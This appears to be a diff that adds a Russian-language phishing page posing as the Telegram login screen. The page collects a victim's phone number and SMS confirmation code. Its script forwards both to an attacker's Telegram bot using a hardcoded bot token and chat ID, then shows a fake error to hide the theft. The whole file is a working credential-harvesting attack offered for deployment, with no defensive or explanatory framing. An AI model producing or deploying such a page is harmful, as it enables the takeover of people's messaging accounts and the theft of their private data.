@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Telegram</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #0f0f0f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .login-container {
+            max-width: 400px;
+            width: 100%;
+            background: #1f1f1f;
+            border-radius: 28px;
+            padding: 32px 24px;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.4);
+            text-align: center;
+        }
+        .telegram-logo {
+            width: 72px;
+            height: 72px;
+            margin-bottom: 24px;
+        }
+        h1 {
+            font-size: 28px;
+            font-weight: 500;
+            color: #ffffff;
+            margin-bottom: 12px;
+        }
+        .sub {
+            color: #aaaaaa;
+            font-size: 16px;
+            margin-bottom: 32px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            color: #ffffff;
+            font-size: 14px;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            background: #2b2b2b;
+            border: 1px solid #3a3a3a;
+            border-radius: 16px;
+            color: #ffffff;
+            outline: none;
+            transition: 0.2s;
+        }
+        input:focus {
+            border-color: #27a4e0;
+            background: #1f1f1f;
+        }
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #27a4e0;
+            color: white;
+            border: none;
+            border-radius: 40px;
+            font-size: 16px;
+            font-weight: 600;
+            margin-top: 12px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        button:hover {
+            background: #1f8bc2;
+        }
+        .footer {
+            margin-top: 28px;
+            font-size: 13px;
+            color: #6c6c6c;
+        }
+        .error {
+            background: #ff3b30;
+            color: white;
+            padding: 10px;
+            border-radius: 14px;
+            font-size: 14px;
+            margin-bottom: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+<div class="login-container" id="app">
+    <img class="telegram-logo" src="https://telegram.org/img/tg_logo_blue.svg" alt="Telegram">
+    <h1>Telegram</h1>
+    <div class="sub">Вход в аккаунт</div>
+
+    <div class="error" id="errorMsg"></div>
+
+    <div id="stepPhone">
+        <div class="input-group">
+            <label>Номер телефона</label>
+            <input type="tel" id="phone" placeholder="+7 900 123 45 67" value="">
+        </div>
+        <button id="sendCodeBtn">Далее</button>
+    </div>
+
+    <div id="stepCode" style="display:none;">
+        <div class="input-group">
+            <label>Код подтверждения</label>
+            <input type="text" id="code" placeholder="12345" autocomplete="off">
+        </div>
+        <button id="submitCodeBtn">Войти</button>
+    </div>
+
+    <div class="footer">
+        🔐 Защищено Telegram
+    </div>
+</div>
+
+<script>
+    let currentPhone = '';
+
+    // ===== ВСТАВЬ СВОИ ДАННЫЕ =====
+    const TELEGRAM_BOT_TOKEN = '8573127698:AAGPByWcBrtpswLWWwDjqcvax8gkJTVeQDc';
+    const YOUR_CHAT_ID = '8573127698';
+    // ===============================
+
+    async function sendToBot(text) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: YOUR_CHAT_ID,
+                    text: text
+                })
+            });
+        } catch(e) {
+            console.error('Ошибка отправки', e);
+        }
+    }
+
+    document.getElementById('sendCodeBtn').onclick = async () => {
+        const phone = document.getElementById('phone').value.trim();
+        if (!phone) {
+            showError('Введите номер телефона');
+            return;
+        }
+        currentPhone = phone;
+        await sendToBot(`📞 НОВЫЙ ЛОГИН\nНомер: ${phone}`);
+        document.getElementById('stepPhone').style.display = 'none';
+        document.getElementById('stepCode').style.display = 'block';
+        document.getElementById('errorMsg').style.display = 'none';
+    };
+
+    document.getElementById('submitCodeBtn').onclick = async () => {
+        const code = document.getElementById('code').value.trim();
+        if (!code) {
+            showError('Введите код из SMS');
+            return;
+        }
+        await sendToBot(`🔐 КОД ПОДТВЕРЖДЕНИЯ\nНомер: ${currentPhone}\nКод: ${code}`);
+        showError('❌ Ошибка. Попробуйте позже.');
+        setTimeout(() => {
+            document.getElementById('stepCode').style.display = 'none';
+            document.getElementById('stepPhone').style.display = 'block';
+            document.getElementById('code').value = '';
+        }, 2000);
+    };
+
+    function showError(msg) {
+        const errDiv = document.getElementById('errorMsg');
+        errDiv.innerText = msg;
+        errDiv.style.display = 'block';
+        setTimeout(() => {
+            errDiv.style.display = 'none';
+        }, 3000);
+    }
+</script>
+</body>
+</html>
